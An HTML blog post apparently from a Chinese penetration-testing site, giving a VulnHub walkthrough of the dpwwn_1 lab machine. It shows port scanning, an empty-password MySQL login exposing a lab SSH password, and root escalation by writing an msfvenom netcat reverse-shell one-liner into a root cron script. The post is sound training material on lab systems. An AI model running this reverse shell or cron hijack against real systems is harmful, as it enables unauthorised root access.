@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-dpwwn_1-Walkthrough，定时任务反弹SHELL拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-dpwwn_1-Walkthrough，定时任务反弹SHELL拿到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 11, 2020&nbsp;&nbsp;12:35:53</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=505688656&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这个靶场和我之前玩的 <code>Born2root&#39;s</code> 有点类似，都是通过定时任务反弹shll</p>
+<p>Name：dpwwn: 1<br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dpwwn-1,342/">https://www.vulnhub.com/entry/dpwwn-1,342/</a><br>靶机介绍：<br>This boot2root is a linux based virtual machine and has been tested using VMware workstation 14.<br>The network interface of VM will take it’s IP settings from DHCP (Network Mode: NAT).<br>Goal: Gain the root privilege and obtain the content of dpwwn-01-FLAG.txt under /root Directory.<br>Note: Tested on VMware workstation 14.<br>Difficulty: Easy/helpful for beginners.</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>靶机 IP : <code>192.168.1.135</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/973.png" alt="图片"></p>
+<p>使用 <code>NMAP</code> 进行端口探测发现靶机开放了 <code>22</code>、<code>80</code>、<code>3306</code> 端口，先从 <code>http</code> 下手看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/974.png" alt="图片"></p>
+<p>在 <code>web</code> 页面上没有得到可利用的信息，只是得到了靶机的中简介为 <code>Apache</code> ，网站绝对路径有可能是：<code>/var/www/html/</code> , 接下来对它进行目录扫描看看有没有泄露一些铭感信息或者文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/975.png" alt="图片"></p>
+<p>打开 <code>info.php</code> 后发现了是网站的 <code>phpinfo</code> 页面，其中网站绝对路径为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCUMENT_ROOT： 	/var/www/html </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/976.png" alt="图片"></p>
+<p>从 <code>web</code> 页面中没找到突破点，接下来换到 <code>3306</code>（Mysql） 服务上，尝试看看能不能登陆到它的 <code>Mysql</code> 数据库（空密码）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.1.135 -u root -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/977.png" alt="图片"></p>
+<p><code>Mysql</code> 未授权登陆成功之后，发现 <code>ssh</code> 数据库里有一个 <code>users</code> 表，里面是一个用户的账号密码信息：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [ssh]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password            <span class="operator">|</span>                                                                                                                                                                      </span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+---------------------+                                                                                                                                                                      </span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> mistic   <span class="operator">|</span> testP@$$swordmistic <span class="operator">|</span>                                                                                                                                                                      </span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+---------------------+ </span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们尝试看看能不能登陆到它的 <code>ssh</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mistic@192.168.1.135</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/978.png" alt="图片"></p>
+<p>成功登陆到 <code>ssh</code> ，接下来就是一系列提权操作！</p>
+<h2 id="定时任务反弹shell提权"><a href="#定时任务反弹shell提权" class="headerlink" title="定时任务反弹shell提权"></a>定时任务反弹shell提权</h2><p>通过查看<code>定时任务</code>发现了一个文件是每<code>三</code>分钟以 <code>root</code> 用户去运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/979.png" alt="图片"></p>
+<p>文件名为 <code>logrot.sh</code> ，既然是 <code>bash</code> 脚本文件那么我就先利用 <code>MSF</code> 生成一个 <code>Payload</code> 用于 <code>Netcat</code> 反弹 shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.128 LPORT=4444 R</span><br><span class="line">注释：R参数是个万能参数，既可以用在php上，也可以用在exe上等等。如果你后期还要对payload进行多次的编辑，那么建议你使用R参数 。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/980.png" alt="图片"></p>
+<p>生成得到的 <code>Payload</code> 为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/fzxvc; nc 192.168.1.128 4444 0&lt;/tmp/fzxvc | /bin/sh &gt;/tmp/fzxvc 2&gt;&amp;1; rm /tmp/fzxvc</span><br></pre></td></tr></table></figure>
+
+<p>我首先新建了一个文件 <code>1</code> ，然后把 <code>MSF</code> 生成的 <code>Payload</code> Copy 到文件 <code>1</code> 里面，接着使用 <code>cat</code> 命令和管道来把内容传到 <code>logrot.sh</code> 文件里：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/981.png" alt="图片"></p>
+<p>这个时候 KALI <code>Netcat</code> 监听 <code>4444</code> 端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/982.png" alt="图片"></p>
+<p>最终也是在 <code>root</code> 目录下拿到 <code>dpwwn-01-FLAG.txt</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/983.png" alt="图片"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次靶机挺简单的，主要还是要掌握 <code>Linux</code> 定时任务反弹 <code>SHELL</code> 这个操作！</p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/02/11/Vulnhub-dpwwn-1/">http://example.com/2020/02/11/Vulnhub-dpwwn-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/12/Vulnhub-five86-1/">VulnHub通关日记-five86-1-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/11/Vulnhub-WTF-1/">VulnHub通关日记-WTF_1-Walkthrough，MITM中间人攻击拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
